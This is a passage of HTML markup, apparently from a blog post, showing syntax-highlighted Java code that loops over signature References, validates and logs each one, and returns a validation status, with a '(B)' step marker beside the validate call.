font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validationStatus </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">false</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validated </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">true</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validationStatus</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">// validate all References</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">@SuppressWarnings</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"unchecked"</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">List</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refs </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">this</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">si</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">getReferences</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">();</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">boolean</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validateRefs </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">true</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">for</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">int</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> i </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> size </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refs</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">size</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">();</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validateRefs </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;&amp;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> i </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> size</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> i</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">++)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ref</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refs</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">get</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">i</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">boolean</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refValid </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ref</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validate</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">vc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">B</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">debug</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"Reference [{}] is valid: {}"</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ref</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">getURI</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(),</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refValid</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validateRefs </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> refValid</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(!</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validateRefs</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">debug</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"Couldn't validate the References"</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validationStatus </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">false</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validated </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">true</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validationStatus</span><span style="background-color: transparent; color: #616161; font-family: Courier New, 